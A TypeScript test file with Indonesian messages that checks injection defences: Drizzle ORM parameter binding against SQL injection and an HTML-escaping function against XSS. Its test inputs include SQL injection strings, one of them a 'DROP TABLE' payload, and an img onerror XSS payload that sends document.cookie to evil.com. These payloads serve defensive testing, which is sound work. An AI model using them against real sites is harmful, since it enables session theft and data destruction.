import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { sql } from 'drizzle-orm';
import { PgDialect } from 'drizzle-orm/pg-core';
import { logTestDetail } from '../helpers/test-utils';

const pgDialect = new PgDialect();

describe('OWASP A03 - Injection Prevention (SQLi & XSS)', () => {
  describe('SQL Injection Prevention via Drizzle ORM', () => {
    it('menggunakan parameter binding yang aman untuk input karakter SQL injection', () => {
      const startTime = performance.now();
      const maliciousInput = "' OR '1'='1' --";

      // Memastikan sql tagged template mengubah parameter menjadi bind variable
      const queryChunk = sql`SELECT * FROM users WHERE email = ${maliciousInput}`;
      const query = pgDialect.sqlToQuery(queryChunk);
      const duration = performance.now() - startTime;

      assert.ok(query.sql.includes('$1'), 'Input harus menggunakan parameter binding ($1)');
      assert.ok(!query.sql.includes(maliciousInput), 'Nilai malicious input tidak boleh masuk ke string SQL mentah');
      assert.strictEqual(query.params[0], maliciousInput, 'Nilai aman tersimpan di params array');

      logTestDetail({
        title: 'SQL Injection Defense (Parameter Binding)',
        target: 'Drizzle ORM Query Compiler',
        duration,
        response: `Payload dicegah masuk mentah. Hasil SQL: "${query.sql}"`,
        details: {
          'Input Payload': maliciousInput,
          'Bound Params': query.params,
        },
      });
    });

    it('tagged template sql operator memisahkan parameter dan syntax SQL', () => {
      const startTime = performance.now();
      const maliciousSearch = "1; DROP TABLE news; --";
      const queryChunk = sql`SELECT * FROM news WHERE id = ${maliciousSearch}`;
      const queryText = pgDialect.sqlToQuery(queryChunk);
      const duration = performance.now() - startTime;

      assert.ok(queryText.sql.includes('$1'), 'Input harus menggunakan placeholder parameterisasi ($1)');
      assert.ok(!queryText.sql.includes('DROP TABLE'), 'Syntax SQL tidak boleh terinjeksi ke dalam query');
      assert.strictEqual(queryText.params[0], maliciousSearch);

      logTestDetail({
        title: 'Separation of Code vs Data (DROP TABLE Injection Test)',
        target: 'Drizzle ORM Template Compiler',
        duration,
        response: `Query tersanitasi menjadi: "${queryText.sql}"`,
        details: {
          'Malicious Syntax': maliciousSearch,
          'Isolated Param': queryText.params[0],
        },
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Sanitization Check', () => {
    function sanitizeHtml(input: string): string {
      return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    }

    it('mengubah tag <script> berbahaya menjadi entitas HTML aman', () => {
      const startTime = performance.now();
      const maliciousPayload = `<script>alert('XSS Attack!')</script>`;
      const sanitized = sanitizeHtml(maliciousPayload);
      const duration = performance.now() - startTime;

      assert.ok(!sanitized.includes('<script>'), 'Tag script tidak boleh tetap utuh');
      assert.ok(sanitized.includes('&lt;script&gt;'), 'Karakter harus di-escape menjadi entitas aman');

      logTestDetail({
        title: 'XSS Script Tag Neutralization',
        target: 'HTML Entity Encoder',
        duration,
        response: `Script dieksekusi di browser sebagai teks murni: "${sanitized}"`,
        details: {
          'Original Payload': maliciousPayload,
          'Sanitized Output': sanitized,
        },
      });
    });

    it('meng-escape event handler berbahaya (onerror, onload, onmouseover)', () => {
      const startTime = performance.now();
      const maliciousPayload = `<img src="invalid.jpg" onerror="fetch('http://evil.com?c=' + document.cookie)" />`;
      const sanitized = sanitizeHtml(maliciousPayload);
      const duration = performance.now() - startTime;

      assert.ok(!sanitized.includes('<img'), 'Tag img mentah tidak boleh lolos tanpa escape');
      assert.ok(sanitized.includes('&lt;img'), 'Tag gambar harus diubah menjadi text entitas');

      logTestDetail({
        title: 'XSS Inline Event Handler Neutralization',
        target: 'HTML Tag Stripper / Encoder',
        duration,
        response: `Tag berbahaya dinetralisir: "${sanitized.slice(0, 45)}..."`,
      });
    });
  });
});
